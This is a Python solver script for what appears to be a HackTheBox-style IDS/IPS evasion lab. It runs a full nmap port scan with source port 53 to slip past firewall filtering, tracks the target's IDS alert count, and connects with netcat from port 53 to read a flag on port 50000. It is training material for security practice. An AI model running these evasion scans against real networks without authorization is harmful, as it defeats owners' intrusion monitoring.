#!/usr/bin/env python3
"""Hard-lab solver using source-port-53 scan and source-port-53 nc connect.

Workflow:
1) sudo nmap -g53 --max-retries=1 -Pn -p- --disable-arp-ping <target>
2) if 50000/tcp is open, connect with:
     sudo nc -nv -s <source_ip> -p53 <target> 50000

Usage:
    sudo python3 hard_lab_service_version_finder.py 10.129.2.47 --source-ip <PWNIP>
"""

import argparse
import os
import re
import socket
import subprocess
import sys
import time
import urllib.request
from typing import List, Optional, Tuple


FLAG_PATTERNS = [
    r"HTB\{[^\r\n}]+\}",
    r"FLAG\{[^\r\n}]+\}",
    r"flag\{[^\r\n}]+\}",
]


def run_cmd(cmd: List[str], timeout: int = 90, stdin_data: Optional[str] = None) -> Tuple[str, str]:
    proc = subprocess.run(
        cmd,
        capture_output=True,
        text=True,
        timeout=timeout,
        input=stdin_data,
    )
    if proc.returncode != 0:
        stderr = proc.stderr.strip()
        stdout = proc.stdout.strip()
        raise RuntimeError(
            f"Command failed: {' '.join(cmd)}\n"
            f"STDOUT:\n{stdout}\nSTDERR:\n{stderr}"
        )
    return proc.stdout, proc.stderr


def run_cmd_allow_timeout(
    cmd: List[str],
    timeout: int,
    stdin_data: Optional[str] = None,
) -> Tuple[str, str, bool]:
    """Run command and return partial output if timeout occurs.

    Returns: (stdout, stderr, timed_out)
    """
    proc = subprocess.Popen(
        cmd,
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
    )
    try:
        stdout, stderr = proc.communicate(input=stdin_data, timeout=timeout)
        return stdout, stderr, False
    except subprocess.TimeoutExpired:
        proc.terminate()
        try:
            stdout, stderr = proc.communicate(timeout=2)
        except subprocess.TimeoutExpired:
            proc.kill()
            stdout, stderr = proc.communicate()
        return stdout, stderr, True


def get_alert_count(target: str, timeout: int = 10) -> Optional[int]:
    with urllib.request.urlopen(f"http://{target}/status.php", timeout=timeout) as response:
        body = response.read().decode("utf-8", errors="ignore")

    match = re.search(r"Recorded alerts:\s*(\d+)\s*/\s*\d+\s*alerts", body, re.IGNORECASE)
    if match:
        return int(match.group(1))
    return None


def detect_source_ip_for_target(target: str) -> str:
    # Use UDP connect trick to pick the outbound interface/address for the target route.
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        sock.connect((target, 53))
        return sock.getsockname()[0]


def scan_with_source_port_53(target: str) -> str:
    cmd = [
        "nmap",
        "-g53",
        "--max-retries=1",
        "-Pn",
        "-p-",
        "--disable-arp-ping",
        target,
    ]
    stdout, _ = run_cmd(cmd, timeout=180)
    return stdout


def extract_flag(text: str) -> Optional[str]:
    for pattern in FLAG_PATTERNS:
        match = re.search(pattern, text)
        if match:
            return match.group(0)
    return None


def parse_open_ports_from_nmap(text: str) -> List[int]:
    ports: List[int] = []
    for line in text.splitlines():
        match = re.match(r"^(\d+)/tcp\s+open\b", line.strip())
        if match:
            ports.append(int(match.group(1)))
    return sorted(set(ports))


def grab_flag_from_50000(target: str, source_ip: str, timeout: int) -> str:
    attempts = [
        ["nc", "-nv", "-w", str(timeout), "-s", source_ip, "-p", "53", target, "50000"],
        ["nc", "-nv", "-s", source_ip, "-p", "53", target, "50000"],
    ]

    combined_outputs: List[str] = []

    for idx, cmd in enumerate(attempts, start=1):
        stdout, stderr, timed_out = run_cmd_allow_timeout(cmd, timeout=timeout, stdin_data="\r\n")
        output = f"{stdout}\n{stderr}".strip()
        tag = f"[nc attempt {idx}{' timed out' if timed_out else ''}]"
        combined_outputs.append(f"{tag}\n{output}".strip())

        # If we already got a flag-like token, stop retrying.
        if extract_flag(output):
            break

        # Small pause before retry to avoid bursty reconnect behavior.
        time.sleep(1)

    return "\n\n".join(combined_outputs).strip()


def main() -> int:
    parser = argparse.ArgumentParser(description="Solve hard IDS/IPS lab with source-port-53 scan")
    parser.add_argument("target", help="Target IP address")
    parser.add_argument(
        "--source-ip",
        help="Your VPN/source IP for nc -s (PWNIP). If omitted, auto-detected.",
    )
    parser.add_argument(
        "--nc-timeout",
        type=int,
        default=25,
        help="Seconds to wait for nc response before collecting partial output (default: 25)",
    )
    args = parser.parse_args()

    if os.geteuid() != 0:
        print("Error: this script must be run as root (use sudo) to perform -sS --source-port 53 scans.", file=sys.stderr)
        return 2

    before = get_alert_count(args.target)
    output = scan_with_source_port_53(args.target)
    after = get_alert_count(args.target)

    open_ports = parse_open_ports_from_nmap(output)
    nc_output = ""

    if 50000 in open_ports:
        source_ip = args.source_ip or detect_source_ip_for_target(args.target)
        nc_output = grab_flag_from_50000(args.target, source_ip, args.nc_timeout)
    else:
        source_ip = args.source_ip or "Not used"

    flag = extract_flag(f"{output}\n{nc_output}")

    print(f"Target: {args.target}")
    print(f"Alerts before: {before if before is not None else 'Unknown'}")
    print("Raw scan output:")
    print(output.strip())
    print(f"Open ports: {', '.join(map(str, open_ports)) if open_ports else 'None'}")
    print(f"Source IP used: {source_ip}")
    print("nc output:")
    print(nc_output if nc_output else "<not executed>")
    print(f"Alerts after: {after if after is not None else 'Unknown'}")
    if before is not None and after is not None:
        print(f"Alert delta: {after - before}")
    print(f"Flag: {flag if flag else 'Not found'}")

    return 0 if flag else 1


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except Exception as exc:
        print(f"Error: {exc}", file=sys.stderr)
        raise SystemExit(1)
